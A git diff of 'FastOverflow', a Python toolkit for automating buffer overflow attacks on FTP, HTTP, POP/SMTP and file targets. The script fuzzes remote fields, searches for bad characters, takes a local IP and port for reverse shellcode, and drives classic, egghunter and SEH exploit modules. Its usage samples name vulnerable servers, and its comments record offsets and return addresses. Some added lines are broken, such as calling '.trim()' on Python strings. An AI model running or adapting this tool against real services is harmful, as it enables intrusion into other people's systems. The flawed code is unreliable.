@@ -1,38 +1,50 @@
 #!/usr/bin/python3
+import argparse
+import random
+import shutil
+import string
 from time import sleep
+import readline
 
 from buffers.egghunter import EggHunter
 from buffers.seh import Seh
 from protocols.ftp import *
 
 from buffers.classic import *
+from utils.colors import *
 from utils.system import *
 from utils.config import *
 
 class FastOverflow:
 
+    tm_columns = 150
+
     def __init__(self, config):
         self.config = config
 
     def menu(self):
+
         print(" ")
-        print("-" * 100)
+        print("-" * self.tm_columns)
 
         if (self.config.mode != "file"):
-            print("[1] Fuzzer")
+            print("[1] Simple Fuzzer (AAAA)")
+            print("[2] Random Fuzzer (A1@!)")
+            print("[3] Test Multiple Fields")
 
-        print("[2] Classic Buffer Overflow")
-        print("[3] EggHunter Buffer Overflow")
-        print("[4] ByPass SEH Buffer Overflow")
-        print("[5] Test Multiple Fields")
+        print("[5] Classic Buffer Overflow")
+        print("[6] EggHunter Buffer Overflow")
+        print("[7] SEH ByPass Buffer Overflow")
+        # print("[] ByPass SEH + Egghunter")
 
-        if (self.config.mode != "file"):
-            print("[6] Search BadChars")
+        print("[8] Search BadChars")
 
-        print("[8] Show Exploit Session")
+        print("[9] Show Exploit Session")
 
-        if (self.config.mode == "ftp" or self.config.mode == "popsmtp"):
-            print("[9] Generate Exploit")
+        if (self.config.mode.lower() in {"ftp", "popsmtp"}):
+            print("[10] Generate Exploit")
+
+        print("[11] Hexa Numeric Decomposition")
 
         print("[0] Exit")
 
@@ -40,21 +52,26 @@ class FastOverflow:
 
         if (process == "1"):
             self.generic_fuzzer()
-        if (process == "2"):
-            self.classical_overflow()
+        elif (process == "2"):
+            print(self.random_fuzzer())
         elif (process == "3"):
-            self.egghunter_overflow()
-        elif (process == "4"):
-            self.seh_overflow()
-        elif (process == "5"):
             print(self.fuzz_fields())
+
+        if (process == "5"):
+            self.classical_overflow()
         elif (process == "6"):
-            self.search_badchars()
+            self.egghunter_overflow()
+        elif (process == "7"):
+            self.seh_overflow()
         elif (process == "8"):
+            self.search_badchars()
+        elif (process == "9"):
             System.show_session(self.config)
             self.menu()
-        elif (process == "9"):
+        elif (process == "10"):
             System.generate_exploit(self.config)
+        elif (process == "11"):
+            System.hex_decomposition(self.config)
         elif (process == "0"):
             sys.exit(0)
 
@@ -63,41 +80,50 @@ class FastOverflow:
 
     def test_badchars(self):
 
-        bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas: ")
+        bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + "! Additional badchars? Separate multiple by commas [40,0a]: ")
 
         if ',' in bads:
             _bads = bads.split(',')
             for _badchar in _bads:
-                System.badchars.append(r'\x'+_badchar)
+                System.badchars.append(r'\x'+_badchar.trim())
         elif bads != "":
-            System.badchars.append(r'\x'+bads)
+            System.badchars.append(r'\x'+bads.trim())
 
-        print("We have bad chars:\n" + ', '.join(System.badchars))
+        print("Got bad chars:\n" + ', '.join(System.badchars))
 
     def search_badchars(self):
+        global columns
 
         adapter = System.get_adapter(self.config)
         inject_func = getattr(adapter, 'inject')
 
-        for x in System.bads_to_test:
+        System.input("[!] All set! Press ENTER when your debugger is ready to receive a single byte sequences :")
+
+        for x in System.nonprint_chars:
             buffer = x
-            buffer += '\r\n'
+
+            print("\n\r[!] ############# Testing char " + str(len(buffer)) + " ----> " + (r'\x{:x}'.format(ord(x))))
 
             try:
-                responses = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
+                buffer += "\r\n"
 
-                print(responses)
+                responses = inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
                 for response in responses:
-                    if "Illegal" in response:
+                    if "Illegal" in response.decode("latin-1"):
                         System.badchars.append(r'\x{:x}'.format(ord(x)))
-                        print(response + ' -- CHARACTER: ' + hex(ord(x)))
+                        # print(response + ' -- CHARACTER: ' + hex(ord(x)))
 
             except socket.error as error:
                 print(error)
 
+        print("=" * self.tm_columns)
         print("Found the following bad chars:\n" + ', '.join(System.badchars))
-        print("=" * 100)
+        self.config.badchars = System.badchars
+        print("=" * self.tm_columns)
         print("")
+
+        System.save_session(self.config)
+
         self.menu()
 
     def fuzz_fields(self):
@@ -108,12 +134,22 @@ class FastOverflow:
         self.config.fields = "," + System.input("[?] Input any additional fields separated by comma : ")
 
         for field in self.config.field.split(","):
-            print("-" * 100)
-            print("[!] Sending 10000 A's on " + field)
+            buffer = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10000))
 
-            overflow = inject_func(self.config.remoteip, self.config.remoteport, field, "A" * 10000, True)
+            print("-" * self.tm_columns)
+            print("[!] Sending randomized buffer on " + field)
+
+            overflow = inject_func(self.config.remoteip, self.config.remoteport, field, buffer, True)
             print("[*] Waiting 3 seconds... ")
             sleep(3)
+
+    def random_fuzzer(self):
+        self.config.offset = 0
+        self.config.overflow = 0
+        self.config.fuzzer_type = "printables"
+
+        System.generic_fuzzer(self.config)
+        self.menu()
 
     def generic_fuzzer(self):
 
@@ -125,13 +161,13 @@ class FastOverflow:
 
     def classical_overflow(self):
 
-        classical_buffer = Classic(self.config)
-        classical_buffer.exploit()
+        process = Classic(self.config)
+        process.exploit()
 
     def egghunter_overflow(self):
 
-        classical_buffer = EggHunter(self.config)
-        classical_buffer.exploit()
+        process = EggHunter(self.config)
+        process.exploit()
 
     def seh_overflow(self):
 
@@ -139,128 +175,125 @@ class FastOverflow:
         process.exploit()
 
 def help():
-    print("=" * 100 + "\r\n")
-    print("Usage: fast_overflow.py -m [MODE] [-o PLATFORM] [-h HOST] [-p PORT] [-f FIELD] [-U USER] [-P PASS] [-i LOCALIP] [-l LOCALPORT] ")
-    print("")
-    print(" -m, --mode=MODE           Specify mode for buffer overflow. Accepted : ftp | http | popsmtp | file")
-    print(" -o, --os=PLATFORM         Target OS Platform for shellcode. Accepted: windows | unix | linux | mac")
-    print(" -h, --host=HOST           Target to attack. Not used in FILE mode")
-    print(" -p, --port=PORT           Port to attack. Not used in FILE mode")
-    print(" -f, --fields=FIELD        Set fields to exploit: user, pass, stor, cookie, user-agent. Separate multiple by commas")
-    print(" -v, --http-verb=HTTPVERB  Set HTTP method to exploit: GET, HEAD, POST, TRACE, etc. Default: HEAD")
-    print(" -u, --http-uri=HTTPURI    Set HTTP uri to exploit. Default: /") # Todo: set uri argument
-    print(" -i, --lip=LOCALIP         Local IP for shellcode")
-    print(" -l, --lport=LOCALPORT     Local Port for shellcode")
-    print(" -U, --auth-user=USER      User for auth. Default: user")
-    print(" -P, --auth-pass=PASS      Pass for auth. Default: user")
-    print("")
-    print("=" * 100)
-    print("")
+    global _tm_columns
+
+    print("=" * _tm_columns + "\r\n")
     print("Samples: \n\r\n\r"
-          "WarFTPd             ./fast_overflow.py -h 172.16.18.128 -p 21 -f user -m ftp -o windows\r\n" # : 485, 32714131, 7c941eed, 16 NOPs"
-          "Ability FTP Server  ./fast_overflow.py -h 172.16.18.128 -p 21 -f stor -m ftp -o windows -U ftp -P ftp\r\n" # : 968, 33674232, 77fab127, 32 NOPs\n\r"
-          "SLMail              ./fast_overflow.py -h 172.16.18.128 -p 110 -m popsmtp -o windows -f pass\r\n" # : 2606, 7608BCCF, 77fab127, 16 NOPs\n\r")
-          "Video Players       ./fast_overflow.py -m file -o windows -i 172.16.18.1 -l 7777\r\n"
-          "Konica Minolta      ./fast_overflow.py -h 172.16.18.138 -p 21 -o windows -m ftp -f cwd\r\n" # SEH : 1037, 1220401E, 8 NOPs\n\r"
-          "Kolibri             ./fast_overflow.py -h 172.16.18.128 -p 8080 -o windows -m http -f uri -v head\r\n" # EggHunting : 515, 32724131, 7CA58265, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
+          "WarFTPd             ./fast_overflow.py -m ftp -t 172.16.18.128 -p 21 -f user\r\n" # : 485, 32714131, 7c941eed, 16 NOPs"
+          "Ability FTP Server  ./fast_overflow.py -m ftp -t 172.16.18.128 -p 21 -f stor -U ftp -P ftp\r\n" # : 968, 33674232, 77fab127, 32 NOPs\n\r"
+          "SLMail              ./fast_overflow.py -m popsmtp -t 172.16.18.128 -p 110 -f pass\r\n" # : 2606, 7608BCCF, 77fab127, 16 NOPs\n\r")
+          "Video Players       ./fast_overflow.py -m file -i 172.16.18.1 -l 7777\r\n"
+          "Konica Minolta      ./fast_overflow.py -m ftp -t 172.16.18.138 -p 21 -f cwd\r\n" # SEH : 1037, 1220401E, 8 NOPs\n\r"
+          "Kolibri             ./fast_overflow.py -m http -t 172.16.18.128 -p 8080 -f uri -hm head\r\n" # EggHunting : 515, 32724131, c, 011EFB28, 011EFAF4, 8 NOPs\n\r"# )
            );
+
+    print("For detailed usage please use help (-h)! ")
 
     sys.exit(1)
 
+def initArgs():
+    parser = argparse.ArgumentParser(description="Fast Overflow Toolkit")
+    parser.add_argument('-m', '--mode', type=str, help='Specify mode for buffer overflow. Accepted : ftp | http | popsmtp | file')
+    parser.add_argument('-o', '--os', type=str, default='windows', help='Target OS Platform for shellcode. Accepted: windows | unix | linux | mac')
+    parser.add_argument('-t', '--target', type=str, help='Target to attack. Not used in FILE mode')
+    parser.add_argument('-p', '--port', type=str, help='Port to attack. Not used in FILE mode')
+    parser.add_argument('-f', '--fields', type=str, help='Set fields to exploit: user, pass, stor, cookie, user-agent. Not used in FILE mode')
+    parser.add_argument('-hm', '--http-method', default='HEAD', type=str, help='Set HTTP method to exploit: GET, HEAD, POST, TRACE, etc. Default: HEAD')
+    parser.add_argument('-u', '--http-uri', default='/', type=str, help='Set HTTP base uri to exploit. Default: /') # Todo: set uri argument
+    parser.add_argument('-i', '--lip', type=str, help='Local IP for shellcode')
+    parser.add_argument('-l', '--lport', type=str, help='Local Port for shellcode')
+    parser.add_argument('-U', '--auth-user', type=str, default='user', help='User for auth. Default: user')
+    parser.add_argument('-P', '--auth-pass', type=str, default='user', help='Pass for auth. Default: user')
+    # parser.add_argument('-si', '--session-ignore', default='False', help='Ignore session file. Default: no')
+    # parser.add_argument('-v', '--verbose', type=int, default='2', help='Verbose level. Default: 2')
+
+    return parser.parse_args()
 
 def main(args):
+    global _tm_columns
+    # os.system("clear")
 
-    # columns, rows = shutil.get_terminal_size((80, 20))
     print("")
-    print("#" * 100)
-    print("")
+    print("#" * _tm_columns + "\r\n")
     print("# FastOverflow v1.0-rc - A toolkit for automating Buffer Overflow process")
     print("# Currently supporting Vanilla, SEH Bypass, EggHunter through HTTP, FTP, POP, SMTP and File")
     print("")
     print("# By Daniel (daniel@zillius.com.br) ")
     print("")
-    print("#" * 100)
+    print("#" * _tm_columns + "\r\n")
 
     _c = Config()
 
-    short_options = "h:p:f:m:o:i:l:v:U:P:"
-    long_options = ["host=", "port=", "field=", "mode=", "os=", "lip=", "lport=", "httpverb=", "user=", "passwd="]
-    _args, values = getopt.getopt(args, short_options, long_options)
-
-    print("")
-    # print(_args)
-    # Evaluate given options
-    for current_arg, current_value in _args:
-        if current_arg in ("-U", "user"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.user = (current_value)
-
-        if current_arg in ("-P"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.passwd = (current_value)
-
-        if current_arg in ("-h", "--host"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.remoteip = (current_value)
-
-        if current_arg in ("-p", "--port"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.remoteport = int(current_value)
-
-        if current_arg in ("-o", "--os"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.platform = (current_value)
-
-        if current_arg in ("-i", "--lip"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.localip = (current_value)
-
-        if current_arg in ("-l", "--lport"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.localport = int(current_value)
-
-        if current_arg in ("-f", "--field"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.field = (current_value)
-
-        if current_arg in ("-v", "--httpverb"):
-            print (("[+] Set " + current_arg + ": %s") % current_value)
-            _c.http_method = (current_value.upper())
-
-        if current_arg in ("-m", "--mode"):
-            # print (("[+] Selected Mode: %s") % current_value)
-
-            if (current_value != "ftp" and current_value != "popsmtp" and current_value != "http" and current_value != "file"):
-                help()
-            else:
-                _c.mode = (current_value)
-
-        if ("--help") in current_arg:
+    if(args.mode != None):
+        if (args.mode.lower() in {"ftp", "popsmtp", "http", "file"}):
+            _c.mode = args.mode.lower()
+        else:
+            print("[!] Invalid Mode!!! \r\n")
             help()
-
-    System.load_session(_c)
-
-    if(_c.mode == "" or _c.mode == None):
+    else:
         print("[!] Missing Mode!!! \r\n")
         help()
 
-    # sys.exit(0);
+    if (args.os != None):
+        _c.platform = args.os
+
+    if (args.target != None):
+        _c.remoteip = args.target
+
+    if (args.port != None):
+        _c.remoteport = args.port
+
+    if (args.fields != None):
+        _c.field = args.fields
+
+    if (args.http_method != None):
+        _c.http_method = args.http_method.upper()
+
+    if (args.http_uri != None):
+        _c.httpuri = args.http_uri
+
+    if (args.lip != None):
+        _c.localip = args.lip
+
+    if (args.lport != None):
+        _c.localport = args.lport
+
+    if (args.auth_user != None):
+        _c.user = args.auth_user
+
+    if (args.auth_pass != None):
+        _c.passwd = args.auth_pass
+
+    if (_c.mode == "file"):
+        _c.remoteip = "file"
+        _c.remoteport = 0
+    else:
+        if (_c.remoteip == None or _c.remoteip == ""):
+            print("[!] Missing Target!!! \r\n")
+            help()
+            sys.exit(0);
+
+        if (_c.remoteport == None or _c.remoteport == 0):
+            print("[!] Missing Remote Port!!! \r\n")
+            help()
+            sys.exit(0);
 
     try:
+        System.load_session(_c)
+
         _f = FastOverflow(_c)
+        _f.tm_columns = _tm_columns
         _f.menu()
 
     except KeyboardInterrupt:
-        save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o")
+        save = System.input("[?] Do you want to save your progress data? [Y]es/[n]o : ")
         if save == "Y":
             System.save_session(_c)
 
-        # _f.menu()
-        # clear()
         sys.exit(1)
 
-
 if __name__ == "__main__":
-    main(sys.argv[1:])
+    _tm_columns, _tm_rows = shutil.get_terminal_size((80, 20))
+    main(initArgs())
 
 
